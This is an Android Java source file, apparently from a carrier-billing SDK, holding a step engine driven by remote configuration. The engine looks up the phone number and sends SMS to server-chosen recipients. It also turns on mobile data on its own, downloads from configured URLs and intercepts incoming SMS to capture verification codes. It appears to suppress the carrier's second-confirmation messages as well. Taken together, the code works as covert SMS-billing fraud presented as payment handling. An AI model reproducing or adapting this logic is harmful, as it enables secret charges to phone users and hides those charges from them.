package com.example.sayid.myapplication.parseStep;

import com.example.sayid.myapplication.common.bean.BlockBean;
import com.example.sayid.myapplication.common.bean.BlockSecondConfirm;
import com.example.sayid.myapplication.common.data.ConfigConst;
import com.example.sayid.myapplication.common.data.ErrorCode;
import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.listener.OnGprsListener;
import com.example.sayid.myapplication.common.listener.OnNetListener;
import com.example.sayid.myapplication.common.listener.SendSmsListener;
import com.example.sayid.myapplication.common.util.FutureUtil;
import com.example.sayid.myapplication.common.util.NetControlUtil;
import com.example.sayid.myapplication.common.util.StringUtil;
import com.example.sayid.myapplication.model.ChannelInfo;
import com.example.sayid.myapplication.model.ReportModel;
import com.example.sayid.myapplication.parseStep.http.DownLoadThread;
import com.example.sayid.myapplication.parseStep.http.HttpPhoneThread;
import com.example.sayid.myapplication.parseStep.http.HttpRequestThread;
import com.example.sayid.myapplication.parseStep.step.action.Base64;
import com.example.sayid.myapplication.parseStep.step.action.Delay;
import com.example.sayid.myapplication.parseStep.step.action.DownLoad;
import com.example.sayid.myapplication.parseStep.step.action.GetSms;
import com.example.sayid.myapplication.parseStep.step.action.Md5;
import com.example.sayid.myapplication.parseStep.step.action.MyRequest;
import com.example.sayid.myapplication.parseStep.step.action.MyResponseStep;
import com.example.sayid.myapplication.parseStep.step.action.Phone;
import com.example.sayid.myapplication.parseStep.step.action.Sms;
import com.example.sayid.myapplication.parseStep.step.action.Step;
import com.example.sayid.myapplication.parseStep.step.response.Key;
import com.example.sayid.myapplication.pay.AppTache;
import com.example.sayid.myapplication.smsutil.SmSutils;

import org.apache.http.HttpEntity;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;

public class ParseStep implements Callable<ParseStepBean> {

    private final static String TAG = "ParseStep";

    /**
     * 是否改变了联网方式
     */
    private static boolean isChangeNetWork;

    /**
     * 是否进行了切apn的动作，如果有完成则接下来的计费可以跳过切apn
     */
    private static boolean isWcApn;

    /**
     * 所有计费请求
     */
    private static List<ParseStepBean> PSB_LIST = new ArrayList<ParseStepBean>();


    /**
     * 构造函数
     * 添加一次计费请求
     */
    public ParseStep() {
    }


    /**
     * 添加一次计费请求
     *
     * @param channelInfo
     */
    public ParseStep(ChannelInfo channelInfo) {
        try {
            if (channelInfo == null || channelInfo.list_action == null) {
                return;
            }

            ParseStepBean psb = new ParseStepBean(channelInfo);
            PSB_LIST.add(psb); // 将请求添加到list里面
        } catch (Exception e) {
            //.e(TAG, e,  "ParseStep error:");
        }
    }

    /**
     * 解析基地业务步骤
     */
    public ParseStepBean call() throws Exception {
        return execute();
    }

    /**
     * 执行基地业务步骤
     */
    public ParseStepBean execute() {
        ParseStepBean psb = null;
        try {
            // 取第一条计费，并删除
            if (PSB_LIST != null && PSB_LIST.size() > 0) {
                psb = PSB_LIST.remove(0);
            }

            if (psb != null) {
                psb.append("\n<br>execute start pay_order_id = " + psb.channelInfo.pay_order_id);
                executeStep(psb);
            }
        } catch (Exception e) {
            //.e(TAG, "execute error:" + e.toString());
        }

        return psb;
    }


    /**
     * 是否有下一次计费请求
     */
    private boolean hasNextExecute() {
        boolean hasNext = false;
        try {
            if (PSB_LIST != null && PSB_LIST.size() > 1) { // 请求列表里请求次数大于1，则表示完成当前计费后要进行下一次计费，此时不需要切网络
                hasNext = true;
            }

            //.d(TAG, "hasNextExecute = " + hasNext);
        } catch (Exception e) {
            //.e(TAG, "hasNextExecute error:" + e.toString());
        }
        return hasNext;
    }

    /**
     * 解析操作步骤
     */
    private void executeStep(ParseStepBean psb) {
        psb.append("\n<br>executeStep current index=" + psb.stepIndex);
        try {

            Step step = psb.getCurrentStep();
            if (step == null) {
                end(psb, false, ErrorCode.CODE_113008);
                return;
            }

            int actionID = step.actionID;
            switch (actionID) {
                case Step.NETWORK:    //切换apn
//					wcApn(psb, step);
                    break;

                case Step.PHONE:     //获取手机号码
                    getPhone(psb, step);
                    break;

                case Step.REQUEST:    //请求
                    request(psb, step);
                    break;

                case Step.DOWNLOAD:   //下载
                    download(psb, step);
                    break;

                case Step.SMS:        //发送短信
                    sendSMS(psb, step);
                    break;

//				case Step.INPUT:      //输入
//					input(psb, step);
//					break;

//				case Step.CALL:       //拨打电话
//					call(psb, step);
//					break;

                case Step.DELAY:     //延时
                    delay(psb, step);
                    break;

                case Step.GETSMS:    //获取短信
                    getSms(psb, step);
                    break;

                case Step.BASE64:    //Base64加解密
                    base64(psb, step);
                    break;

                case Step.MD5:    //Md5加密
                    md5(psb, step);
                    break;

                case Step.END:       //结束
                    end(psb, true, ErrorCode.CODE_119999);
                    break;
            }
        } catch (Exception e) {
            psb.append("\n<br>executeStep error:" + e.toString());
        }
    }

    /**
     * 切换apn
     *
     * @param step
     */
    private void wcApn(final ParseStepBean psb, Step step) {
    }

    /**
     * 获取手机号码
     *
     * @param step
     */
    private void getPhone(final ParseStepBean psb, Step step) {
        final Phone phone = (Phone) step;
        try {
//			if (AppData.phone_channel >= phone.channel && StringUtil.length(AppData.phoneNum) > 0) {
//				psb.map.put(phone.variable, AppData.phoneNum);
//				nextStep(psb);        //下一步
//			} else {
            final OnNetListener listener = new OnNetListener() {
                @Override
                public void onSuccess(HttpEntity entity, boolean isEnc) {
                    parseResponse(psb, phone, entity);
                }

                @Override
                public void onFailed(String exceptionId, String exceptionText) {
                    if (exceptionId != null && !exceptionId.equals("")) {
                        end(psb, false, exceptionId);
                    } else {
                        end(psb, false, ErrorCode.CODE_119999);
                    }
                }

                @Override
                public void onTimeout() {
                    end(psb, false, ErrorCode.CODE_111006);
                }
            };
            new HttpPhoneThread().startThread(psb, phone, listener);
//			}
        } catch (Exception e) {
            psb.append("\n<br>getPhone error:" + e.toString());
            end(psb, false, ErrorCode.CODE_111005);
        }
    }

    /**
     * 请求
     *
     * @param step
     */
    private void request(final ParseStepBean psb, Step step) {
        final MyRequest request = (MyRequest) step;

        try {
            final OnNetListener listener = new OnNetListener() {
                @Override
                public void onSuccess(HttpEntity entity, boolean isEnc) {
                    parseResponse(psb, request, entity);
                }

                @Override
                public void onFailed(String exceptionId, String exceptionText) {
                    if (exceptionId != null && !exceptionId.equals("")) {
                        end(psb, false, exceptionId);
                    } else {
                        end(psb, false, ErrorCode.CODE_111007);
                    }
                }

                @Override
                public void onTimeout() {
                    end(psb, false, ErrorCode.CODE_111008);
                }
            };

            if (!NetControlUtil.getInstance(AppTache.context).isNetConnected()) {
                if (ConfigConst.IS_OPEN_GPRS) {
                    NetControlUtil.getInstance(AppTache.context).openGprs(new OnGprsListener() {
                        @Override
                        public void onGprsState(boolean isConnected) {
                            psb.append("\n<br>isConnected = " + isConnected);

                            if (isConnected) {
                                // 打开网络成功或者失败 都发出支付请求
                                new HttpRequestThread().startThread(psb, request, listener);
                            } else {
                            }
                        }
                    }, 30);
                } else {
                    psb.append("\n<br>isOpenGPRS=" + ConfigConst.IS_OPEN_GPRS + "不自动打开GPRS");
                }
            } else {
                // 打开网络成功或者失败 都发出支付请求
                new HttpRequestThread().startThread(psb, request, listener);
            }
        } catch (Exception e) {
            psb.append("\n<br>request error:" + e.toString());
            end(psb, false, ErrorCode.CODE_111007);
        }
    }

    /**
     * 解析返回数据
     *
     * @param psb
     * @param prstep
     * @param entity
     */
    private void parseResponse(ParseStepBean psb, MyResponseStep prstep, HttpEntity entity) {
        try {
            if (prstep.response != null) {
                if (1 == prstep.response.bodyType) {
                    String result = EntityUtils.toString(entity, "utf-8");
                    psb.append("\n<br>result=" + result);
                    prstep.response.body = result;

                    List<Key> keys = prstep.response.keys;
                    if (keys != null && keys.size() > 0) {
                        for (Key key : keys) {
                            if (result.contains(key.keyWord)) {
                                // 上一步是拦截短信
                                int getSmsIndex = psb.stepIndex - 1;
                                Object object = psb.getStep(getSmsIndex);
                                if (object instanceof GetSms) {
                                    GetSms getSms = (GetSms) object;

                                    // 删除拦截
                                    ParseStepBeanCache.getInstance().remove(psb.key_id);

                                    // 更新拦截信息
                                    BlockSecondConfirm bsc = new BlockSecondConfirm();
                                    bsc.confirmUpdate(AppTache.context, "", psb.key_id, getSms.inceptNum, getSms.inceptMsg);
                                }

                                psb.append("\n<br>keyWord " + key.keyWord + ", stepIndex=" + key.stepIndex);
                                prstep.response.parseResponseParam(psb, prstep);
                                gotoStep(psb, key.stepIndex);
                                return;
                            }
                        }

                        // 上一步是拦截短信，验证码失败，重新获取验证码
                        int getSmsIndex = psb.stepIndex - 1;
                        Object object = psb.getStep(getSmsIndex);
                        if (object instanceof GetSms) {
                            psb.setStepIndex(getSmsIndex);
                            psb.append("\n<br>Sms captcha fail: current index=" + psb.stepIndex + ", success=" + false + ", errorCode=" + ErrorCode.CODE_114014);

                            requestReportBase(psb, "2", ErrorCode.CODE_114014);
                        } else {
                            end(psb, false, ErrorCode.CODE_113006);
                        }
                        return;
                    } else {
                        prstep.response.parseResponseParam(psb, prstep);
                        nextStep(psb); // 下一步
                    }
                } else if (2 == prstep.response.bodyType) {
                    byte[] data = EntityUtils.toByteArray(entity);

                    prstep.response.bodyByte = data;
                    prstep.response.parseResponseParam(psb, prstep);
                    nextStep(psb); // 下一步
                }
            } else {
                String result = EntityUtils.toString(entity, "utf-8");
                psb.append("\n<br>result=" + result);
                nextStep(psb); // 下一步
            }
        } catch (Exception e) {
            psb.append("\n<br>parseResponse error:" + e.toString());
        }
    }

    /**
     * 下载
     *
     * @param step
     */
    private void download(final ParseStepBean psb, Step step) {
        DownLoad downLoad = (DownLoad) step;
        try {
            String url = StringUtil.replaceMapValue(psb.map, downLoad.url);
            if (url == null || url.equals("")) {
                end(psb, false, ErrorCode.CODE_113002);
                return;
            }

            final OnNetListener listener = new OnNetListener() {
                @Override
                public void onSuccess(HttpEntity entity, boolean isEnc) {
                    psb.append("\n<br>download - onSuccess");
                    nextStep(psb);
                }

                @Override
                public void onFailed(String exceptionId, String exceptionText) {
                    if (exceptionId != null) {
                        if (exceptionId != null && !exceptionId.equals(""))
                            end(psb, false, exceptionId);
                        else
                            end(psb, false, ErrorCode.CODE_111003);
                    } else {
                        end(psb, false, ErrorCode.CODE_111003);
                    }
                }

                @Override
                public void onTimeout() {
                    end(psb, false, ErrorCode.CODE_111004);
                }
            };
            new DownLoadThread().startThread(psb, downLoad, listener);
        } catch (Exception e) {
            psb.append("\n<br>download error:" + e.toString());
            end(psb, false, ErrorCode.CODE_111003);
        }
    }

    /**
     * 发送短信
     *
     * @param step
     */
    private void sendSMS(final ParseStepBean psb, Step step) {
        Sms sms = (Sms) step;
        try {
            String receiver_value = StringUtil.replaceMapValue(psb.map, sms.receiver);
            String msg_value = StringUtil.replaceMapValue(psb.map, sms.msg);

//			SendSms testSendSms = new SendSms(AppTache.context, new SendSmsListener(){
//				@Override
//				public void onSendSmsSuccess(final String user_order_id, final String pay_order_id, String destPhone, String message, int times) {
//					ParseStep parseStep = new ParseStep(){
//						public ParseStepBean call() throws Exception {
//							// 上一步是拦截短信
//							int getSmsIndex = psb.stepIndex - 1;
//							Object object = psb.getStep(getSmsIndex);
//							if (object instanceof GetSms) {
//								GetSms getSms = (GetSms) object;
//
//								// 删除拦截
//								ParseStepBeanCache.getInstance().remove(pay_order_id);
//
//								// 更新拦截信息
//								BlockSecondConfirm bsc = new BlockSecondConfirm();
//								bsc.confirmUpdate(AppTache.context, user_order_id, pay_order_id, getSms.inceptNum, getSms.inceptMsg);
//							}
//
//							nextStep(psb);
//							return psb;
//						}
//					};
//					FutureUtil.execute(parseStep);
//				}
//
//				@Override
//				public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, final String errorCode) {
//					ParseStep parseStep = new ParseStep(){
//						public ParseStepBean call() throws Exception {
//							end(psb, false, errorCode);
//							return psb;
//						}
//					};
//					FutureUtil.execute(parseStep);
//				}
//			});


            SmSutils.sendSMS(psb.channelInfo.user_order_id, "",
                    receiver_value, msg_value, new SendSmsListener() {
                        public void onSendSmsSuccess(final String user_order_id,
                                                     final String pay_order_id, String destPhone, String message, int times) {

                            ParseStep parseStep = new ParseStep() {
                                public ParseStepBean call() throws Exception {
                                    // 上一步是拦截短信
                                    int getSmsIndex = psb.stepIndex - 1;
                                    Object object = psb.getStep(getSmsIndex);
                                    if (object instanceof GetSms) {
                                        GetSms getSms = (GetSms) object;
                                        // 删除拦截
                                        ParseStepBeanCache.getInstance().remove(pay_order_id);
                                        // 更新拦截信息
                                        BlockSecondConfirm bsc = new BlockSecondConfirm();
                                        bsc.confirmUpdate(AppTache.context, user_order_id, pay_order_id, getSms.inceptNum, getSms.inceptMsg);
                                    }
                                    nextStep(psb);
                                    return psb;

                                }
                            };
                            FutureUtil.execute(parseStep);
                        }

                        public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, final String errorCode) {
                            ParseStep parseStep = new ParseStep() {
                                public ParseStepBean call() throws Exception {
                                    if (errorCode != null && !errorCode.equals(""))
                                        end(psb, false, errorCode);
                                    else
                                        end(psb, false, ErrorCode.CODE_119999);
                                    return psb;
                                }
                            };
                            FutureUtil.execute(parseStep);
                        }
                    });

            psb.append("\n<br>sendSms: type=" + sms.type + ", destPhone=" + receiver_value + ", destPort=" + sms.destPort + ", charsetName=" + sms.charsetName + ", destMsg=" + msg_value);
            //testSendSms.sendSms("", psb.channelInfo.pay_order_id, sms.type, receiver_value, sms.destPort, sms.charsetName, msg_value, psb.channelInfo.send_sms_timeout);

        } catch (Exception e) {
            psb.append("\n<br>sendSms error:" + e.toString());
        }
    }

    /**
     * 延时
     *
     * @param step
     */
    private void delay(ParseStepBean psb, Step step) {
        Delay delayBean = (Delay) step;
        int delayTime = delayBean.delayTime;

        try {
            // 每10秒中执行一次
            int count = delayTime / 10;
            for (int i = 0; i < count; i++) {
                Thread.sleep(10 * 1000);
            }
        } catch (InterruptedException e) {
            psb.append("\n<br>delay error:" + e.toString());
        } finally {
            nextStep(psb);
        }
    }

    /**
     * 获取短信
     *
     * @param step
     */
    public void getSms(ParseStepBean psb, Step step) {
        GetSms getSmsBean = (GetSms) step;

        // 加入短信拦截队列
        BlockBean scb = getSmsBean.getBlockBean(psb.channelInfo);

        //TODO 更改context获取方式
        BlockDao blockDao = new BlockDao(AppTache.context);
        blockDao.insert(scb);

        psb.key_id = scb.pay_order_id;
        ParseStepBeanCache.getInstance().add(psb);

        psb.append(getSmsBean.toString());

        end(psb, false, ErrorCode.CODE_114014);
    }

    /**
     * Base64加解密
     *
     * @param step
     */
    public void base64(ParseStepBean psb, Step step) {
        Base64 base64 = (Base64) step;

        try {
            List<Key> keys = base64.keys;
            if (keys != null && keys.size() > 0) {
                for (Key key : keys) {
                    if (psb.map.get(key.keyWord).contains(key.value)) {
                        // 解析Base64动作
                        base64.parseBase64(psb);
                        gotoStep(psb, key.stepIndex);
                        return;
                    }
                }

                end(psb, false, ErrorCode.CODE_113006);
                return;
            } else {
                // 解析Base64动作
                base64.parseBase64(psb);
                nextStep(psb); // 下一步
            }
        } catch (Exception e) {
            psb.append("\n<br>base64 error:" + e.toString());
            end(psb, false, ErrorCode.CODE_113012);
        }
    }

    /**
     * Md5加密
     *
     * @param step
     */
    public void md5(ParseStepBean psb, Step step) {
        Md5 md5 = (Md5) step;

        try {
            List<Key> keys = md5.keys;
            if (keys != null && keys.size() > 0) {
                for (Key key : keys) {
                    if (psb.map.get(key.keyWord).contains(key.value)) {
                        // 解析Md5动作
                        md5.parseMd5(psb);
                        gotoStep(psb, key.stepIndex);
                        return;
                    }
                }
                end(psb, false, ErrorCode.CODE_113006);
                return;
            } else {
                // 解析Md5动作
                md5.parseMd5(psb);
                nextStep(psb); // 下一步
            }
        } catch (Exception e) {
            psb.append("\n<br>md5 error:" + e.toString());
            end(psb, false, ErrorCode.CODE_113011);
        }
    }

    /**
     * 结束
     *
     * @param success
     * @param errorCode
     */
    public void end(ParseStepBean psb, boolean success, String errorCode) {
        psb.append("\n<br>end: current index=" + psb.stepIndex + ", success=" + success + ", errorCode=" + errorCode);

        psb.isPaySuccess = success;
        psb.errorCode = errorCode;
        if (success) {
            requestReportBase(psb, "1", errorCode);

        } else {
            requestReportBase(psb, "2", errorCode);
        }

        // 下一次计费
        nextExecute(psb);
    }

    /**
     * 将计费结果返回给上层应用
     */
    private void nextExecute(final ParseStepBean psb) {
        //.d(TAG, "nextExecute");

        try {
            if (hasNextExecute()) {  //继续进行下一次计费请求
                psb.onPayEvent();
                execute();      //继续下一次计费
            } else {                //当前没有下一次计费请求
                //.d(TAG, "isChangeNetWork=" + isChangeNetWork);
                if (isChangeNetWork) {
                    //.d(TAG, "restoreApn--->");
                } else {
                    psb.onPayEvent();

                    clean();
                }
            }
        } catch (Exception e) {
            //.e(TAG, e, "onPayEvent error:");
        }
    }

    /**
     * 计费结束
     * 内存回收
     */
    private void clean() {
        //.d(TAG, "-----clean-----");
        isChangeNetWork = false;
        isWcApn = false;
        if (PSB_LIST != null) {
            PSB_LIST.clear();
        }
        System.gc();
    }

    /**
     * 进行下一步操作
     */
    public void nextStep(ParseStepBean psb) {
        gotoStep(psb, ++psb.stepIndex);
    }

    /**
     * 跳转到某一步操作
     */
    private void gotoStep(ParseStepBean psb, int step) {
        psb.stepIndex = step;

        if (psb.stepIndex == psb.stepTotal) {
            end(psb, true, ErrorCode.CODE_119999);
        } else {
            if (psb.stepIndex < 0 || psb.stepIndex > psb.stepTotal - 1) {
                end(psb, false, ErrorCode.CODE_113007);
                return;
            }
            executeStep(psb);
        }
    }

    /**
     * 上报基地支付结果
     * 基地  status1表示成功，2表示失败
     *
     * @param psb
     * @param status
     * @param errorCode
     */
    private void requestReportBase(ParseStepBean psb, String status, String errorCode) {
        int errorStep = 0;
        if (status.equals("2")) { // 失败，则上传失败的步骤
            errorStep = psb.stepIndex;
        }

        ReportModel.getInstanse(AppTache.context).addReportBasePay(psb.channelInfo.pay_order_id, status, errorStep, errorCode, psb.sbLog.toString());
    }
}
